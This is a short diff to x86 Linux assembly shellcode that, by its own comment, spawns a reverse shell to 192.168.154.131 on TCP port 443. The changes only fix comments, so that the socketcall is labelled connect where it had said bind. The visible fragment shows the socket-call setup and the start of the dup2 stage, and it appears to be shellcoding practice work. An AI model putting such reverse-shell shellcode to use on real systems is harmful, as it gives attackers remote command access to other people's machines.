@@ -27,7 +27,7 @@ _start:
 
         xor edi, edi            ;zero out edi
         mov al, 0x66            ;socketcall syscall
-        mov bl, 0x3             ;socketcall type (sys_bind 2)
+        mov bl, 0x3             ;socketcall type (sys_connect 3)
 
 ;Spawning reverse shell to IP 192.168.154.131 on TCP port 443
 
@@ -41,7 +41,7 @@ _start:
         push ecx
         push edx
         mov ecx, esp
-        int 0x80                ;execute bind syscall
+        int 0x80                ;execute connect syscall
 
 
 ;int dup2(int oldfd, int newfd)
